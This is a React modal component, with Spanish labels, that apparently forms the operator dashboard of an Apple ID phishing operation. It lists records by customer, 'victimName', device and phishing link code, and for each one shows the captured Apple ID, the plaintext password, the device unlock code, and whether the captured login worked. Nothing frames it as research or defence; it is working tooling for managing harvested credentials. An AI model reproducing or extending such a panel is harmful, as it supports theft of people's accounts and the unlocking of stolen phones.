import React, { useState, useEffect } from 'react';
import { createPortal } from 'react-dom';

const ModalDetailsProcess = ({
   isOpen,
   toggleModal,
   user,
   listObtainedUsername,
   fetchTableDetails,
   handleDeleteObtained
}) => {
   const [link, setLink] = useState("");
   const [processes, setProcesses] = useState([]);
   const [details, setDetails] = useState([]);
   const [isLoading, setIsLoading] = useState(false);

   // Cargar lista de procesos inicial
   useEffect(() => {
      const loadInitialData = async () => {
         if (isOpen) {
            try {
               const data = await listObtainedUsername();
               setProcesses(data || []);
               if (data && data.length > 0 && !link) {
                  setLink(data[0].linkCode);
               }
            } catch (error) {
               console.error("Error al obtener lista de procesos:", error);
            }
         }
      };
      loadInitialData();
   }, [isOpen, listObtainedUsername]);

   // Cargar detalles cuando cambia el link seleccionado
   useEffect(() => {
      const loadDetails = async () => {
         if (isOpen && link) {
            setIsLoading(true);
            try {
               const data = await fetchTableDetails({
                  username: user?.username,
                  linkCode: link
               });
               setDetails(Array.isArray(data) ? data : [data]);
            } catch (error) {
               console.error("Error al obtener detalles:", error);
               setDetails([]);
            } finally {
               setIsLoading(false);
            }
         } else if (!link) {
            setDetails([]);
         }
      };
      loadDetails();
   }, [link, isOpen, user?.username, fetchTableDetails]);

   const modalContent = (
      <div className="fixed inset-0 z-[99999] flex items-center justify-center overflow-y-auto p-5 backdrop-blur-sm bg-black/40">
         <div className="relative w-full max-w-[700px] max-h-[90vh] flex flex-col rounded-3xl bg-white shadow-2xl dark:bg-gray-900 overflow-hidden">

            {/* --- HEADER --- */}
            <div className="sticky top-0 z-10 bg-blue-600 p-6 shadow-md lg:px-11">
               <div className="flex items-center justify-between">
                  <div className="text-left">
                     <h4 className="text-2xl font-bold text-white">Detalles del proceso</h4>
                     <p className="mt-1 text-sm text-blue-100 opacity-90">
                        {isLoading ? "Cargando..." : `Se encontraron ${details.length} registros`}
                     </p>
                  </div>
                  <button
                     onClick={() => {
                        toggleModal(false);
                        setLink("");
                        setDetails([]);
                     }}
                     className="rounded-full p-2 text-white/80 hover:bg-white/20 hover:text-white transition-colors"
                  >
                     <svg xmlns="http://www.w3.org/2000/svg" className="h-7 w-7" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
                     </svg>
                  </button>
               </div>
            </div>

            {/* --- CUERPO --- */}
            <div className="no-scrollbar overflow-y-auto p-6 lg:p-11">
               <div className="space-y-6">

                  <div className="flex flex-col gap-2 mb-2">
                     <label className="text-xs font-bold uppercase tracking-widest text-gray-400 ml-1">Seleccionar Proceso</label>
                     <select
                        className="w-full p-3 rounded-xl border border-gray-200 bg-gray-50 dark:bg-gray-800 dark:border-gray-700 outline-none focus:ring-2 focus:ring-blue-500 transition-all text-sm font-medium"
                        value={link}
                        onChange={(e) => setLink(e.target.value)}
                     >
                        <option value="">Seleccione un cliente...</option>
                        {processes
                           .filter((item, index, self) =>
                              index === self.findIndex((t) => t.linkCode === item.linkCode)
                           )
                           .map((item) => (
                              <option key={item._id} value={item.linkCode}>
                                 {item.customer} — {item.victimName} — {item.device} — {item.linkCode}
                              </option>
                           ))}
                     </select>
                  </div>

                  <hr className="border-gray-100 dark:border-gray-800" />

                  {details.length > 0 ? (
                     details.map((item, index) => (
                        <div
                           key={item._id || index}
                           className="relative overflow-hidden rounded-2xl border border-gray-200 bg-white shadow-sm dark:border-gray-800 dark:bg-gray-900/50"
                        >
                           <div className={`absolute left-0 top-0 h-full w-1.5 ${item.response?.includes('WRONG') ? 'bg-red-500' : 'bg-green-500'}`}></div>

                           <div className="p-5 sm:p-6">
                              <div className="mb-4 flex items-center justify-between">
                                 <h5 className="flex items-center gap-2 text-xs font-bold text-gray-400 uppercase tracking-widest">
                                    <span className="flex h-6 w-6 items-center justify-center rounded-full bg-gray-100 text-[10px] dark:bg-gray-800 text-gray-500">
                                       {index + 1}
                                    </span>
                                    Detalle del Registro
                                 </h5>

                                 <div className="flex items-center gap-4">
                                    <span className={`text-[10px] font-bold uppercase ${(item?.status === 'passcode_process' || item?.status === 'passcode')
                                       ? 'text-orange-500' :
                                       item?.status === 'false'
                                          ? 'text-red-500' :
                                          item?.status === 'true'
                                             ? 'text-green-500' : 'text-gray-400'
                                       }`}>
                                       {(item?.status === 'passcode_process' || item?.status === 'passcode')
                                          ? 'Passcode' :
                                          item?.status === 'false'
                                             ? 'Fallido' :
                                             item?.status === 'true'
                                                ? 'Completado' : 'Desconocido'}
                                    </span>
                                    <button
                                       onClick={async () => {
                                          if (handleDeleteObtained) {
                                             await handleDeleteObtained(item._id);
                                             setDetails(details.filter(d => d._id !== item._id));
                                          }
                                       }}
                                       className="text-gray-300 hover:text-red-500 transition-colors"
                                       title="Eliminar registro"
                                    >
                                       <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16" />
                                       </svg>
                                    </button>
                                 </div>
                              </div>

                              {/* --- SECCIÓN DE DATOS CONDICIONALES --- */}
                              <div className="grid grid-cols-1 gap-4 sm:grid-cols-2">

                                 {/* Apple ID */}
                                 {item.appleID && (
                                    <div className="rounded-xl border border-gray-100 bg-gray-50 p-4 dark:border-gray-800 dark:bg-white/[0.02]">
                                       <p className="mb-1 text-[11px] font-semibold uppercase text-gray-500">Apple ID</p>
                                       <p className="break-all text-sm font-medium text-gray-800 dark:text-white">
                                          {item.appleID}
                                       </p>
                                    </div>
                                 )}

                                 {/* Contraseña */}
                                 {item.password && (
                                    <div className="rounded-xl border border-gray-100 bg-gray-50 p-4 dark:border-gray-800 dark:bg-white/[0.02]">
                                       <p className="mb-1 text-[11px] font-semibold uppercase text-gray-500">Contraseña</p>
                                       <p className="break-all font-mono text-xl font-bold text-blue-600 dark:text-blue-400">
                                          {item.password}
                                       </p>
                                    </div>
                                 )}

                                 {/* Código de Desbloqueo (Dato separado) */}
                                 {item.codesUnlock && (
                                    <div className="rounded-xl border border-gray-100 bg-gray-50 p-4 dark:border-gray-800 dark:bg-white/[0.02]">
                                       <p className="mb-1 text-[11px] font-semibold uppercase text-gray-500">Código de Desbloqueo</p>
                                       <p className="break-all font-mono text-xl font-bold text-orange-600 dark:text-orange-400">
                                          {item.codesUnlock}
                                       </p>
                                    </div>
                                 )}

                              </div>

                              {/* Respuesta del Sistema */}
                              {item.response && (
                                 <div className="mt-4">
                                    <p className="mb-1 text-[11px] font-semibold uppercase text-gray-500">Respuesta del Sistema</p>
                                    <div className="rounded-xl p-4 bg-red-50 border border-red-100 text-red-700 dark:bg-red-900/10 dark:border-red-900/30 dark:text-red-400">
                                       <p className="whitespace-pre-wrap break-words text-sm leading-relaxed italic">
                                          {item.response}
                                       </p>
                                    </div>
                                 </div>
                              )}
                           </div>
                        </div>
                     ))
                  ) : (
                     !isLoading && (
                        <div className="py-20 text-center">
                           <p className="text-gray-400 dark:text-gray-500">
                              {link ? "No hay registros para este proceso." : "Seleccione un proceso arriba para ver detalles."}
                           </p>
                        </div>
                     )
                  )}
               </div>
            </div>
         </div>
      </div>
   );

   return (
      <>{isOpen && createPortal(modalContent, document.body)}</>
   );
};

export default ModalDetailsProcess;